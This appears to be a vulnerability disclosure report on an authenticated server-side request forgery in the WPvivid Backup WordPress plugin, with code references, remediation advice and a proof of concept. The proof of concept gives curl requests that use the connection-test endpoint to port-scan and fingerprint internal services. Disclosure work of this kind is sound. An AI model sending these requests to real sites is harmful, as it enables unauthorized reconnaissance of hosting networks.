=== SOFTWARE DETAILS ===

Type of Software: WordPress Plugin

Software Name: WPvivid Backup Plugin

Software Slug: wpvivid-backuprestore

Affected Version(s): <= 0.9.136

=== VULNERABILITY DETAILS ===

Description of Vulnerability

The plugin's AJAX handler wpvivid_test_remote_connection (includes/class-wpvivid.php:361) allows an administrator to test a remote storage connection before saving it. The handler validates the wpvivid_ajax nonce and the manage_options capability, then passes the raw attacker-supplied JSON ("remote" POST parameter) straight into WPvivid_Remote_collection::get_remote() (includes/class-wpvivid-remote-collection.php), which instantiates the storage class WITHOUT any of the sanitization that the save path applies. The save path (add_remote → sanitize_options) restricts FTP to port 21 and validates options, but the test path invokes test_connect() directly on the raw options, so host and port are fully attacker-controlled.

The FTP/SFTP test_connect() implementations (includes/customclass/class-wpvivid-ftpclass.php:276, class-wpvivid-sftpclass.php:319) then attempt a real connection to the arbitrary host:port from the web server, and return a JSON response whose error message and timing reveal whether the port is open, whether the service speaks FTP/SSH, and other service fingerprints (e.g. pointing SFTP at a MySQL port returns "are you sure you're connected to an SSH server?", pointing FTP at an open non-FTP port returns a login timeout after the TCP handshake, pointing it at a closed port returns instantly). This makes the endpoint a server-side request forgery and internal port-scanning oracle.

On WordPress Multisite, manage_options is a per-site capability: an administrator of ANY subsite (a lower trust boundary than the network owner — the same population that the cross-subsite backup-scoping fixes of comparable plugins address) has manage_options on their own site and can therefore use this endpoint to probe the hosting network's internal services (database servers, Redis, cloud metadata endpoints on some setups) from the web server, a network position they would not otherwise control.

Verified dynamically on a real two-site Multisite network (WordPress 6.7.1, WPvivid 0.9.136): a subsite-only administrator (no capabilities on the main site, no manage_network) passes the handler's capability check and test_connect() attempts the connection to an arbitrary internal host:port (127.0.0.1:3306 observed: TCP connection established, FTP login timeout after 10s — versus instant failure on a closed port; SFTP against the same port returned the SSH-expected error message, confirming service fingerprinting).

Vulnerability Type: Server-Side Request Forgery (SSRF)

Impact Statement: Administrators of a subsite on Multisite installations (or any administrator on single-site) can use the remote-storage connection test to probe arbitrary internal host:port pairs from the web server, fingerprinting internal services (open/closed, protocol type) via the returned error messages and timing — network reconnaissance from a trust position that should not have network-level access.

Common Weakness (CWE) Type: CWE-918 (Server-Side Request Forgery (SSRF))

Authentication Level Required: Administrator (per-site on Multisite)

References to Affected Code:
- https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php (test_remote_connection, line ~361: raw $_POST['remote'] JSON passed through without sanitize_options)
- https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-remote-collection.php (get_remote: instantiates remote class with unvalidated options)
- https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-ftpclass.php (test_connect, line ~276: connects to arbitrary host/port; sanitize_options with the port-21 restriction exists but is NOT called on this path)

References:
- https://wordpress.org/plugins/wpvivid-backuprestore/
- CVE-2024-10705 and CVE-2024-10706 (unauthenticated RCE/arbitrary file read in wpvivid_do_restore and related handlers) are unrelated: they concerned missing capability checks on restore handlers; this finding concerns a fully-authenticated SSRF via the connection-test path that performs no host validation.

=== PROOF OF CONCEPT ===

Prerequisites:
- WordPress 6.7.1 Multisite (subdirectory network with 2 sites), WPvivid Backup Plugin 0.9.136 activated on a subsite (/site2/)
- An administrator account of the subsite only (user "subadmin", no capabilities on the main site, not a super admin)
- A service listening on an internal port of the web server (here MariaDB on 127.0.0.1:3306)

Step 1 — Log in as the subsite administrator and obtain a wpvivid_ajax nonce (any WPvivid admin page of the subsite localizes it):
curl -s -c cookies.txt -X POST "http://TARGET/wp-login.php" \
  -d "log=subadmin&pwd=<password>&wp-submit=Log+In&redirect_to=http://TARGET/site2/wp-admin/&testcookie=1"
# nonce from the localized wpvivid_ajax_object on any plugin admin page of /site2/

Step 2 — SSRF: port-scan an internal host:port through the connection test:
curl -s -b cookies.txt -X POST "http://TARGET/site2/wp-admin/admin-ajax.php" \
  -d "action=wpvivid_test_remote_connection&nonce=<nonce>&type=ftp" \
  --data-urlencode 'remote={"type":"ftp","host":"127.0.0.1","username":"x","password":"x","port":"3306","path":"/","passive":"1"}'
Observed: {"result":"failed","error":"Login failed. The connection has timed out. Please try again later."} after ~10s
— the TCP connection to 127.0.0.1:3306 succeeded (port OPEN); the FTP layer timed out waiting for an FTP banner.

Step 3 — Service fingerprinting via SFTP against the same port:
curl -s -b cookies.txt -X POST "http://TARGET/site2/wp-admin/admin-ajax.php" \
  -d "action=wpvivid_test_remote_connection&nonce=<nonce>&type=sftp" \
  --data-urlencode 'remote={"type":"sftp","host":"127.0.0.1","username":"x","password":"x","port":"3306","path":"/"}'
Observed: ConnectionClosedException "are you sure you're connected to an SSH server?" — the error message differs per service type, allowing protocol fingerprinting.

Negative control (closed port 59999): same error text but returned in ~0s versus ~10s for the open port — the timing difference (FTP banner wait) is the open/closed oracle usable for port scanning.

Note on the port restriction: the same options through the SAVE path (wpvivid_add_remote) are rejected with "Currently, only port 21 is supported" by FTPClass::sanitize_options() — proving the validation exists but is bypassed on the test path.

Environment / Configuration Details: WordPress 6.7.1 Multisite (2 sites), PHP 8.2.34, MariaDB 11.5.2 on 127.0.0.1:3306, WPvivid Backup Plugin 0.9.136 active on subsite /site2/, subsite administrator "subadmin" (verified: manage_options on blog 2 = yes, on blog 1 = no, manage_network = no).

Certify PoC tested step-by-step: YES

Did you use AI? YES

=== OTHER DETAILS ===

Have you requested a CVE from another CNA? NO
Have you reported this to another vendor? NO
Terms agreement: YES

=== SUGGESTED REMEDIATION ===

1. In test_remote_connection(), apply the same sanitize_options() validation used by the save path before instantiating the remote object — the test must never accept options the save path would reject.
2. Validate the host against a blocklist (private/loopback/link-local ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7) unless a "trusted destination" option is explicitly enabled by a super admin.
3. Resolve hostnames server-side before connecting and re-validate the resolved IP (against DNS-rebinding).
4. Restrict test-able ports to the protocol's standard port (21 for FTP, 22 for SFTP) or a super-admin-configured allowlist.
